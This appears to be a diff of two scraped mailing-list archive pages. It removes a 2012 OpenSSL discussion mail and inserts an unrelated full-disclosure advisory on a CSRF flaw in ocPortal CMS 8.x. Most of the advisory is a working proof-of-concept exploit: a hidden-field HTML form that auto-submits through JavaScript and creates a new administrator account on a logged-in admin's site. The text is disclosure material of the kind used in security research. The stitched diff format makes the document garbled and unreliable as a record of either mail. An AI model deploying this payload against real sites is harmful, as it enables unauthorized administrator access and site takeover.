@@ -1,54 +1,318 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/23/12
-Message-ID: <OF5EE2B5C5.F11C9695-ON862579CA.005960A4-862579CA.005A991A@us.ibm.com>
-Date: Fri, 23 Mar 2012 11:29:33 -0500
-From: Ivan Nestlerode <inestlerode@...ibm.com>
-To: Marcus Meissner <meissner@...e.de>
-Cc: OSS Security List <oss-security@...ts.openwall.com>
-Subject: Re: openssl security issue or not? (CVE Request?)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/19/1
+Message-ID: <CAPYM6VzPGUQRtWsDEGW22u2DaOuye34UMTzy9JbPBBtXxDk9Vg@mail.gmail.com>
+Date: Sun, 19 Aug 2012 19:15:06 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
+Subject: ocPoral CMS 8.x | Cross Site Request Forgery (CSRF) Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Marcus Meissner <meissner@...e.de> wrote on 03/23/2012 11:13:20 AM:
-> From: Marcus Meissner <meissner@...e.de>
-> To: OSS Security List <oss-security@...ts.openwall.com>
-> Cc: Ivan Nestlerode/Cambridge/IBM@...US
-> Date: 03/23/2012 11:13 AM
-> Subject: openssl security issue or not? (CVE Request?)
-> 
-> Hi folks, Ivan,
-> 
-> This patch:
-> http://cvs.openssl.org/chngview?cn=22161
-> fixes a decrypt error return values and according to the changelog
-> "detects symmetric crypto errors" 
-> 
-> I am not sure if this counts as security issue in the end, but "not
-> detecting a failed decrypt" seems to me like it is a security issue.
-> 
-> Any comments?
-> 
-> Ciao, Marcus
-> (also https://bugzilla.novell.com/show_bug.cgi?id=749210 ) 
+1. OVERVIEW
 
-Marcus,
+ocPoral CMS 8.x and lower versions are  vulnerable to Cross-site
+Request Forgery (CSRF / XSRF).
 
-I don't think that this change needs separate tracking as a security issue 
-since there is no guarantee that you can detect symmetric decryption 
-errors anyway (it is not that hard for random gibberish to decrypt with 
-correct PKCS#5 padding).  This change made its way into their CVS first, 
-but it was actually meant to go in along with another change that is a 
-security fix and already has a CVE entry associated with it 
-(CVE-2012-0884):
-http://cvs.openssl.org/chngview?cn=22238
 
-If a Linux distribution picks up the fix for CVE-2012-0884 then they will 
-want to pick up change 22161 at the same time since the fix for the 
-security vulnerability will generally cause symmetric decryption errors 
-when it kicks in and things get very confusing for the end user without 
-change 22161 (they will frequently get junk results with a success return 
-value instead of an error return value).  Both were reported to OpenSSL at 
-the same time, but the CVE change was submitted later because it was more 
-complicated and required more review and discussion.
+2. PRODUCT DESCRIPTION
 
-Hope that helps,
--Ivan
+ocPortal is the website Content Management System (a CMS) for building
+and maintaining a dynamic website. ocPortal's powerful feature-set
+means there's always a way to accomplish your vision. Not only does
+ocPortal's CMS have all the features you'd expect: for instance photo
+galleries, news, file downloads and community forums/chats, but it
+does so whilst meeting the highest accessibility and professional
+standards. It is also smart enough to go beyond page management, to
+automatically handle search engine optimisation, and provide
+aggressive hack attack prevention.
+
+
+3. VULNERABILITY DESCRIPTION
+
+ocPoral CMS 8.x and lower versions contain a flaw that allows a remote
+Cross-site Request Forgery (CSRF / XSRF) attack. The flaw exists
+because the application does not require multiple steps or explicit
+confirmation for sensitive transactions for majority of administrator
+functions such as adding new user, downgrading security
+settings,..etc. By using a crafted URL, an attacker may trick the
+victim into visiting to his web page to take advantage of the trust
+relationship between the authenticated victim and the application.
+Such an attack could trick the victim into executing arbitrary
+commands in the context of their session with the application, without
+further prompting or verification.
+
+
+4. VERSIONS AFFECTED
+
+Tested on version 8.1.2
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+The following CSRF payload would add new admin user.
+
+[HTML]
+   <form action="http://localhost/ocPortal/adminzone/index.php?page=admin_ocf_join&type=step2"
+method="POST">
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;1&#95;value"
+value="About&#32;me" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;2&#95;value"
+value="Skype&#32;ID" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;3&#95;value"
+value="Facebook&#32;profile" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;4&#95;value"
+value="Google&#43;&#32;profile" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;5&#95;value"
+value="Twitter&#32;account" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;6&#95;value" value="Interests"
+/>
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;7&#95;value" value="Location"
+/>
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;8&#95;value"
+value="Occupation" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;9&#95;value"
+value="Staff&#32;notes" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;21&#95;value"
+value="First&#32;name" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;22&#95;value"
+value="Last&#32;name" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;23&#95;value"
+value="Street&#32;address" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;24&#95;value" value="City" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;25&#95;value" value="State" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;26&#95;value"
+value="Post&#32;code&#32;&#47;&#32;Zip&#32;code" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;custom&#95;27&#95;value" value="Country"
+/>
+      <input type="hidden" name="label&#95;for&#95;&#95;username"
+value="Username" />
+      <input type="hidden" name="username" value="hax0r1" />
+      <input type="hidden" name="require&#95;&#95;username" value="1" />
+      <input type="hidden" name="label&#95;for&#95;&#95;password"
+value="Password" />
+      <input type="hidden" name="password" value="p&#35;ssw&#33;123" />
+      <input type="hidden" name="require&#95;&#95;password" value="0" />
+      <input type="hidden" name="password&#95;confirm"
+value="p&#35;ssw&#33;123" />
+      <input type="hidden"
+name="require&#95;&#95;password&#95;confirm" value="0" />
+      <input type="hidden" name="email&#95;address"
+value="hax0r&#64;yehg&#46;net" />
+      <input type="hidden" name="require&#95;&#95;email&#95;address"
+value="0" />
+      <input type="hidden" name="dob&#95;day" value="1" />
+      <input type="hidden" name="dob&#95;month" value="1" />
+      <input type="hidden" name="dob&#95;year" value="1882" />
+      <input type="hidden" name="require&#95;&#95;dob" value="0" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;reveal&#95;age"
+value="&#155;&#32;Reveal&#32;age" />
+      <input type="hidden"
+name="tick&#95;on&#95;form&#95;&#95;reveal&#95;age" value="0" />
+      <input type="hidden" name="require&#95;&#95;reveal&#95;age" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;timezone"
+value="Time&#32;zone" />
+      <input type="hidden" name="timezone" value="America&#47;New&#95;York" />
+      <input type="hidden" name="require&#95;&#95;timezone" value="1" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;allow&#95;emails"
+value="Receive&#32;e&#45;mails&#32;from&#32;other&#32;members" />
+      <input type="hidden" name="allow&#95;emails" value="1" />
+      <input type="hidden"
+name="tick&#95;on&#95;form&#95;&#95;allow&#95;emails" value="0" />
+      <input type="hidden" name="require&#95;&#95;allow&#95;emails" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;zone&#95;wide"
+value="Opt&#32;to&#32;hide&#32;the&#32;left&#47;right&#32;navigation"
+/>
+      <input type="hidden" name="zone&#95;wide" value="1" />
+      <input type="hidden"
+name="tick&#95;on&#95;form&#95;&#95;zone&#95;wide" value="0" />
+      <input type="hidden" name="require&#95;&#95;zone&#95;wide" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;theme" value="Theme" />
+      <input type="hidden" name="theme" value="&#45;1" />
+      <input type="hidden" name="require&#95;&#95;theme" value="1" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;views&#95;signatures"
+value="View&#32;signatures" />
+      <input type="hidden" name="views&#95;signatures" value="1" />
+      <input type="hidden"
+name="tick&#95;on&#95;form&#95;&#95;views&#95;signatures" value="0" />
+      <input type="hidden"
+name="require&#95;&#95;views&#95;signatures" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;pt&#95;allow"
+value="Allow&#32;Private&#32;Topics&#32;from" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="2" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="3" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="4" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="5" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="6" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="7" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="8" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="9" />
+      <input type="hidden" name="pt&#95;allow&#91;&#93;" value="10" />
+      <input type="hidden" name="require&#95;&#95;pt&#95;allow" value="0" />
+      <input type="hidden"
+name="comcode&#95;&#95;pt&#95;rules&#95;text" value="1" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;pt&#95;rules&#95;text"
+value="Private&#32;Topic&#32;guidelines" />
+      <input type="hidden" name="pt&#95;rules&#95;text" value="" />
+      <input type="hidden" name="pt&#95;rules&#95;text&#95;parsed" value="" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;on&#95;probation&#95;until"
+value="On&#32;probation&#32;until" />
+      <input type="hidden" name="on&#95;probation&#95;until&#95;day" value="" />
+      <input type="hidden" name="on&#95;probation&#95;until&#95;month"
+value="" />
+      <input type="hidden" name="on&#95;probation&#95;until&#95;year"
+value="" />
+      <input type="hidden" name="on&#95;probation&#95;until&#95;hour"
+value="" />
+      <input type="hidden"
+name="on&#95;probation&#95;until&#95;minute" value="" />
+      <input type="hidden"
+name="require&#95;&#95;on&#95;probation&#95;until" value="0" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;primary&#95;group"
+value="Primary&#32;usergroup" />
+      <input type="hidden" name="primary&#95;group" value="2" />
+      <input type="hidden" name="require&#95;&#95;primary&#95;group"
+value="1" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;secondary&#95;groups"
+value="Additional&#32;usergroup&#32;membership" />
+      <input type="hidden"
+name="require&#95;&#95;secondary&#95;groups" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;validated"
+value="Validated" />
+      <input type="hidden" name="validated" value="1" />
+      <input type="hidden"
+name="tick&#95;on&#95;form&#95;&#95;validated" value="0" />
+      <input type="hidden" name="require&#95;&#95;validated" value="0" />
+      <input type="hidden"
+name="label&#95;for&#95;&#95;highlighted&#95;name"
+value="Highlighted&#32;name" />
+      <input type="hidden"
+name="tick&#95;on&#95;form&#95;&#95;highlighted&#95;name" value="0" />
+      <input type="hidden"
+name="require&#95;&#95;highlighted&#95;name" value="0" />
+      <input type="hidden" name="comcode&#95;&#95;field&#95;1" value="1" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;1"
+value="About&#32;me" />
+      <input type="hidden" name="field&#95;1" value="" />
+      <input type="hidden" name="field&#95;1&#95;parsed" value="" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;2"
+value="Skype&#32;ID" />
+      <input type="hidden" name="field&#95;2" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;2" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;3"
+value="Facebook&#32;profile" />
+      <input type="hidden" name="field&#95;3" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;3" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;4"
+value="Google&#43;&#32;profile" />
+      <input type="hidden" name="field&#95;4" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;4" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;5"
+value="Twitter&#32;account" />
+      <input type="hidden" name="field&#95;5" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;5" value="0" />
+      <input type="hidden" name="comcode&#95;&#95;field&#95;6" value="1" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;6"
+value="Interests" />
+      <input type="hidden" name="field&#95;6" value="" />
+      <input type="hidden" name="field&#95;6&#95;parsed" value="" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;7"
+value="Location" />
+      <input type="hidden" name="field&#95;7" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;7" value="0" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;8"
+value="Occupation" />
+      <input type="hidden" name="field&#95;8" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;8" value="0" />
+      <input type="hidden" name="comcode&#95;&#95;field&#95;9" value="1" />
+      <input type="hidden" name="label&#95;for&#95;&#95;field&#95;9"
+value="Staff&#32;notes" />
+      <input type="hidden" name="field&#95;9" value="" />
+      <input type="hidden" name="field&#95;9&#95;parsed" value="" />
+      <input type="hidden" name="field&#95;21" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;21" value="0" />
+      <input type="hidden" name="field&#95;22" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;22" value="0" />
+      <input type="hidden" name="field&#95;23" value="" />
+      <input type="hidden" name="pre&#95;f&#95;field&#95;23" value="1" />
+      <input type="hidden" name="require&#95;&#95;field&#95;23" value="0" />
+      <input type="hidden" name="field&#95;24" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;24" value="0" />
+      <input type="hidden" name="field&#95;25" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;25" value="0" />
+      <input type="hidden" name="field&#95;26" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;26" value="0" />
+      <input type="hidden" name="field&#95;27" value="" />
+      <input type="hidden" name="require&#95;&#95;field&#95;27" value="0" />
+      <input type="hidden" name="http&#95;referer"
+value="http&#58;&#47;&#47;localhost" />
+      <input type="hidden"
+name="pt&#95;rules&#95;text&#95;&#95;is&#95;wysiwyg" value="1" />
+      <input type="hidden" name="field&#95;1&#95;&#95;is&#95;wysiwyg"
+value="1" />
+      <input type="hidden" name="field&#95;6&#95;&#95;is&#95;wysiwyg"
+value="1" />
+      <input type="hidden" name="field&#95;9&#95;&#95;is&#95;wysiwyg"
+value="1" />
+      <input type="submit" value="Submit form" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+[/HTML]
+
+
+6. SOLUTION
+
+No fix is available as of 2012-08-19.
+Workaround is not to visit third-party web sites while
+administratoring the ocportal application.
+
+
+7. VENDOR
+
+ocPortal Development Team
+http://www.ocportal.com/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2012-07-29: notified vendor, vendor did not plan to release fix
+because of default deployed referer check
+2012-08-19: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5Bocportal_8x%5D_csrf
+
+
+#yehg [2012-08-19]
